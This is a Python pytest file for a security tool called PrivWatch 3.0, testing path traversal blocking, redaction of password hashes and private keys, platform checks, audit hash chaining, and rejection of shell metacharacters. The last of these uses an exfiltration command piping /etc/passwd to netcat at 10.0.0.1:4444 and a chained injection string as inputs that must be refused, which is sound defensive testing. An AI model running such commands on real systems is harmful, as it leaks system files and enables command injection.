"""
PrivWatch 3.0 - Security Tests: Input Validation, Path Traversal, Platform Enforcement,
Command Execution Safety, and Evidence Cryptographic Hash Chaining.
"""

import os
from pathlib import Path
import pytest
import sys

from utils.file_utils import safe_resolve_path
from core.evidence import EvidenceManager
from core.scanner import BaseScanner
from core.command_exec import LinuxCommandRunner
from core.platform_validator import LinuxPlatformValidator, UnsupportedPlatformError
from core.storage import StorageEngine
from core.models import Finding, Severity


class DummyScanner(BaseScanner):
    def scan(self):
        return []


def test_path_traversal_prevention(temp_dir):
    base_dir = temp_dir / "safe_dir"
    base_dir.mkdir()

    # Normal inside path should resolve
    inside_file = base_dir / "test.json"
    inside_file.write_text("{}")
    resolved = safe_resolve_path(str(inside_file), base_dir=str(base_dir))
    assert resolved is not None

    # Path traversal ../ outside base_dir must be rejected
    traversal_path = str(base_dir / ".." / "secret.txt")
    resolved_outside = safe_resolve_path(traversal_path, base_dir=str(base_dir))
    assert resolved_outside is None


def test_sensitive_data_sanitization():
    # Test SHA-512 crypt hash redaction
    raw_shadow_entry = "root:$6$vB3Wj9...fakehash1234567890abcdef...:19200:0:99999:7:::"
    sanitized = EvidenceManager.sanitize(raw_shadow_entry)
    assert "$6$" not in sanitized
    assert "[REDACTED_PASSWORD_HASH]" in sanitized

    # Test private key redaction
    raw_key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----"
    sanitized_key = EvidenceManager.sanitize(raw_key)
    assert "MIIEow" not in sanitized_key
    assert "[REDACTED_PRIVATE_KEY]" in sanitized_key


def test_command_execution_safety():
    scanner = DummyScanner("TEST")
    # Argument list execution does not trigger shell execution
    out = scanner.run_command([sys.executable, "-c", "print('hello_privwatch')"])
    assert "hello_privwatch" in out


def test_command_runner_rejects_shell_metacharacters():
    """Verify that command runner refuses strings with shell metacharacters."""
    res_pipe = LinuxCommandRunner.execute("cat /etc/passwd | nc 10.0.0.1 4444")
    assert not res_pipe.available
    assert "metacharacters are strictly forbidden" in res_pipe.stderr

    res_semi = LinuxCommandRunner.execute("ls; id; whoami")
    assert not res_semi.available
    assert "metacharacters are strictly forbidden" in res_semi.stderr


def test_platform_validator_rejects_non_linux(monkeypatch):
    """Verify that non-Linux operating systems raise UnsupportedPlatformError."""
    import platform
    monkeypatch.setattr(platform, "system", lambda: "Windows")
    with pytest.raises(UnsupportedPlatformError):
        LinuxPlatformValidator.validate_platform(strict=True)

    monkeypatch.setattr(platform, "system", lambda: "Darwin")
    with pytest.raises(UnsupportedPlatformError):
        LinuxPlatformValidator.validate_platform(strict=True)


def test_storage_preserves_zero_confidence(temp_dir):
    """Verify DEF-06 fix: A stored confidence of 0.0 must remain 0.0."""
    db_file = str(temp_dir / "conf_test.db")
    storage = StorageEngine(db_file)

    finding = Finding(
        finding_id="fnd_zero_conf",
        vector="TEST",
        severity=Severity.LOW.value,
        title="Zero Confidence Finding",
        confidence=0.0
    )
    storage.save_finding(finding)

    retrieved = storage.get_findings(vector="TEST")
    assert len(retrieved) == 1
    assert retrieved[0].confidence == 0.0


def test_storage_cryptographic_hash_chain(temp_dir):
    """Verify DEF-06: Audit trail generates and verifies SHA-256 hash chaining."""
    db_file = str(temp_dir / "hash_test.db")
    storage = StorageEngine(db_file)

    h1 = storage.log_admin_action("ACTION_1", "target_1", "admin", {"step": 1}, "SUCCESS")
    h2 = storage.log_admin_action("ACTION_2", "target_2", "admin", {"step": 2}, "SUCCESS")
    h3 = storage.log_admin_action("ACTION_3", "target_3", "admin", {"step": 3}, "SUCCESS")

    assert h1 != h2 != h3
    is_valid, err = storage.verify_audit_chain_integrity()
    assert is_valid is True
    assert err is None
